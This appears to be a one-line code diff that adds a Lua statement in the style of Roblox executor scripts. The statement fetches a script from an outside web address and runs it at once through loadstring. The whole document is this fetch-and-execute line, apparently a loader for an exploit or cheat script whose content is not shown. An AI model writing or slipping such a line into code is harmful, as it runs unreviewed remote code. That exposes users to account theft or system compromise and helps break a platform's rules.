@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://hesiz.com/api/0rXsXbOp/raw"))()
